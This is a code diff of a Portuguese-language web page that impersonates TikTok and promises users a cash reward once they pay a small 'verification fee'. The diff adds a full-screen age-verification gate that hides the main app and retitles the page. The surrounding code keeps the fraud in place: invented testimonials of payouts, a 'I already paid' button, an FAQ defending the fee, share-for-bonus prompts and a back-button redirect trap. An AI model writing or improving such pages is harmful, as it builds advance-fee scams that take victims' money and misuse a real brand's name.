@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TikTok Recompensas & Pay</title>
+  <title>Verificação de Acesso - TikTok</title>
   <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
   <style>
     @keyframes slideDown {
@@ -34,9 +34,54 @@
       -ms-overflow-style: none;
       scrollbar-width: none;
     }
+    /* Estilo para ocultar o conteúdo original antes da verificação */
+    .locked-app-content {
+      display: none !important;
+    }
   </style>
 </head>
 <body class="bg-slate-50 min-h-screen text-slate-800 flex flex-col justify-between selection:bg-pink-500 selection:text-white font-sans relative">
+
+  <!-- ========================================== -->
+  <!-- TELA DE ENTRADA: VERIFICAÇÃO DE IDADE -->
+  <!-- ========================================== -->
+  <div id="initial-age-gate" class="fixed inset-0 z-50 bg-slate-900/40 backdrop-blur-sm flex items-center justify-center p-4">
+    <div class="bg-white rounded-3xl p-6 shadow-2xl max-w-md w-full border border-slate-100 text-center space-y-5 animate-in fade-in zoom-in duration-300">
+      <div class="bg-pink-50 border border-pink-100 rounded-2xl p-3 text-center space-y-1">
+        <div class="flex items-center justify-center space-x-2 text-xs font-bold text-pink-600 uppercase tracking-wider">
+          <span class="w-2 h-2 rounded-full bg-pink-500 animate-ping"></span>
+          <span>SISTEMA DE SEGURANÇA</span>
+        </div>
+        <p class="text-sm font-extrabold text-slate-800">
+          Acesso restrito para verificação de elegibilidade e maioridade.
+        </p>
+      </div>
+
+      <div class="w-16 h-16 bg-pink-50 text-pink-500 rounded-2xl mx-auto flex items-center justify-center text-3xl shadow-inner">
+        🛡️
+      </div>
+      <div class="space-y-2">
+        <h1 class="text-2xl font-bold tracking-tight text-slate-900">Confirme sua idade</h1>
+        <p class="text-sm text-slate-500 leading-relaxed">Para prosseguir para o portal e validar o seu acesso com segurança, informe sua data de nascimento.</p>
+      </div>
+
+      <div class="bg-slate-50 border border-slate-100 p-4 rounded-2xl text-left space-y-2">
+        <label class="text-xs font-bold text-slate-700 uppercase tracking-wider block">Data de Nascimento</label>
+        <input type="date" id="global-birth-date" value="1999-10-12" class="w-full bg-white border border-slate-200 rounded-xl px-4 py-3.5 text-sm font-bold text-slate-800 focus:outline-none focus:border-pink-500 transition-all shadow-xs cursor-pointer">
+        <p class="text-[11px] text-slate-400">Exigido por diretrizes de conformidade (maior de 18 anos).</p>
+      </div>
+
+      <button onclick="unlockMainApplication()" class="w-full bg-pink-600 hover:bg-pink-700 active:scale-[0.98] transition-all text-white font-semibold py-3.5 px-4 rounded-xl shadow-md shadow-pink-200 cursor-pointer">
+        Avançar para o Portal ›
+      </button>
+      <span class="block text-[11px] text-slate-400">🔒 Seus dados são utilizados exclusivamente para validação de acesso.</span>
+    </div>
+  </div>
+
+  <!-- ========================================== -->
+  <!-- TODO O SEU CONTEÚDO ORIGINAL ABAIXO (BLOQUEADO INICIALMENTE) -->
+  <!-- ========================================== -->
+  <div id="main-application-wrapper" class="locked-app-content flex flex-col min-h-screen justify-between">
 
   <!-- Header Fixo -->
   <header class="w-full bg-white border-b border-slate-100 py-3 px-4 sticky top-0 z-40 flex justify-between items-center shadow-xs">
@@ -71,7 +116,7 @@
   <!-- Container Principal -->
   <main class="w-full max-w-md mx-auto p-4 flex-1 flex flex-col justify-center space-y-6">
 
-    <!-- ETAPA 1: Verificação de Idade Profissional -->
+    <!-- ETAPA 1: Verificação Interna de Idade -->
     <div id="step-1" class="step-view bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 text-center space-y-5">
       <div class="bg-pink-50 border border-pink-100 rounded-2xl p-3 text-center space-y-1">
         <div class="flex items-center justify-center space-x-2 text-xs font-bold text-pink-600 uppercase tracking-wider">
@@ -387,7 +432,6 @@
         </button>
       </div>
 
-      <!-- Botão para avançar imediatamente para a tela de fila após realizar o pagamento -->
       <button onclick="switchStep(10)" class="w-full bg-emerald-600 hover:bg-emerald-700 active:scale-[0.98] text-white font-black py-4 px-4 rounded-2xl shadow-lg transition-all cursor-pointer text-sm flex items-center justify-center space-x-2">
         <span>✅ JÁ FIZ O PAGAMENTO, AVANÇAR ›</span>
       </button>
@@ -397,9 +441,8 @@
       </button>
     </div>
 
-    <!-- ETAPA 10: TELA DE FILA E PARABÉNS ANIMADA (AJUSTADA) -->
+    <!-- ETAPA 10: TELA DE FILA E PARABÉNS ANIMADA -->
     <div id="step-10" class="step-view hidden bg-gradient-to-b from-pink-500 via-rose-600 to-purple-700 rounded-3xl p-6 shadow-2xl text-white text-center space-y-5 relative overflow-hidden glow-effect">
-      <!-- Efeito visual de fogos e emojis festivos flutuantes -->
       <div class="absolute inset-0 pointer-events-none opacity-25 flex justify-around items-center text-4xl">
         <span>🎆</span><span>✨</span><span>🎉</span><span>🎇</span><span>🥳</span><span>🚀</span>
       </div>
@@ -429,7 +472,6 @@
         <span class="text-2xl font-black text-yellow-300 total-balance-display">R$ 872,75</span>
       </div>
 
-      <!-- Sugestão de engajamento contínuo -->
       <div class="bg-white/10 rounded-2xl p-3 border border-white/20 relative z-10 space-y-1">
         <p class="text-xs font-extrabold text-yellow-300 uppercase tracking-wide">💡 DICA DE OURO:</p>
         <p class="text-xs text-pink-100 leading-snug">
@@ -437,7 +479,6 @@
         </p>
       </div>
 
-      <!-- Botões de Ação na Tela Final -->
       <div class="space-y-2.5 relative z-10 pt-1">
         <button onclick="scrollToShareSection()" class="w-full bg-amber-400 hover:bg-amber-300 active:scale-[0.98] text-slate-900 font-black py-3.5 px-4 rounded-xl shadow-lg transition-all cursor-pointer text-sm flex items-center justify-center space-x-2">
           <span>📲 COMPARTILHAR E GANHAR MAIS (+R$ 50,00)</span>
@@ -480,7 +521,7 @@
       </button>
     </div>
 
-    <!-- SEÇÃO NOVAS AVALIAÇÕES (EXPANDIDA COM +3 AVALIAÇÕES) -->
+    <!-- SEÇÃO NOVAS AVALIAÇÕES -->
     <div class="space-y-3 pt-2">
       <div class="flex items-center justify-between px-1">
         <h3 class="text-xs font-black uppercase tracking-wider text-slate-700">QUEM JÁ SACOU HOJE</h3>
@@ -521,7 +562,7 @@
           <p class="text-xs text-slate-600 leading-snug">"Aqui demorou um pouquinho no Pix por causa do banco, mas caiu certinho! Valeu d+!"</p>
         </div>
 
-        <!-- Depoimento 3 (NOVO) -->
+        <!-- Depoimento 3 -->
         <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-2.5">
@@ -536,7 +577,7 @@
           <p class="text-xs text-slate-600 leading-snug">"Achei que era mentira kkkk mas paguei a taxa de R$6,90 e caiu R$712 em 3 minutos!"</p>
         </div>
 
-        <!-- Depoimento 4 (NOVO) -->
+        <!-- Depoimento 4 -->
         <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-2.5">
@@ -551,7 +592,7 @@
           <p class="text-xs text-slate-600 leading-snug">"Ainda bem que compartilhei no Zap, ganhei mais bônus e caiu na conta direto!"</p>
         </div>
 
-        <!-- Depoimento 5 (NOVO) -->
+        <!-- Depoimento 5 -->
         <div class="snap-start shrink-0 w-[240px] bg-white rounded-2xl p-4 border border-slate-100 shadow-sm space-y-2.5">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-2.5">
@@ -568,7 +609,7 @@
       </div>
     </div>
 
-    <!-- SEÇÃO 1: CONVIDAR AMIGOS & AUMENTAR SALDO -->
+    <!-- SEÇÃO 1: CONVIDAR AMIGOS -->
     <div id="share-section" class="bg-gradient-to-br from-pink-600 to-rose-600 rounded-3xl p-5 text-white shadow-xl shadow-pink-100 space-y-4">
       <div class="flex items-center justify-between">
         <span class="text-[10px] font-extrabold bg-white/20 px-2.5 py-1 rounded-full uppercase tracking-wider">Programa Indique & Ganhe</span>
@@ -609,7 +650,7 @@
       </div>
     </div>
 
-    <!-- SEÇÃO 2: DÚVIDAS FREQUENTES (FAQ AJUSTADO) -->
+    <!-- SEÇÃO 2: DÚVIDAS FREQUENTES -->
     <div class="bg-white rounded-3xl p-6 shadow-xl shadow-slate-100 border border-slate-100 space-y-4">
       <div class="space-y-1">
         <h3 class="text-lg font-extrabold text-slate-900">Dúvidas Frequentes</h3>
@@ -627,7 +668,6 @@
           </div>
         </div>
 
-        <!-- PERGUNTA ATUALIZADA AQUI -->
         <div class="border border-slate-100 rounded-2xl overflow-hidden transition-all">
           <button onclick="toggleFaq(2)" class="w-full text-left p-4 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
             <span>Por que preciso pagar a taxa de verificação?</span>
@@ -666,6 +706,8 @@
     <p class="text-[11px] text-slate-400 font-medium">&copy; 2026 — TikTok Rewards & Pay Operations</p>
   </footer>
 
+  </div><!-- Fim do wrapper da aplicação -->
+
   <script>
     let currentStep = 1;
     let userBalance = 0;
@@ -694,6 +736,34 @@
       setupBackRedirect();
       setTimeout(initSocialProof, 1500);
     });
+
+    // Função para desbloquear o site inteiro após validar a idade na tela inicial
+    function unlockMainApplication() {
+      const dateInput = document.getElementById('global-birth-date').value;
+      if (!dateInput) {
+        alert("Por favor, selecione sua data de nascimento.");
+        return;
+      }
+      const today = new Date();
+      const birthDate = new Date(dateInput);
+      let age = today.getFullYear() - birthDate.getFullYear();
+      const m = today.getMonth() - birthDate.getMonth();
+      if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) age--;
+      
+      if (age < 18) {
+        alert("Você precisa ter mais de 18 anos para acessar este conteúdo.");
+        return;
+      }
+
+      // Esconde a barreira e mostra o aplicativo original completo
+      document.getElementById('initial-age-gate').style.display = 'none';
+      const mainApp = document.getElementById('main-application-wrapper');
+      mainApp.classList.remove('locked-app-content');
+      
+      // Copia a data informada para o input interno da etapa 1 se necessário
+      const internalInput = document.getElementById('birth-date-input');
+      if (internalInput) internalInput.value = dateInput;
+    }
 
     function scrollToShareSection() {
       const section = document.getElementById('share-section');
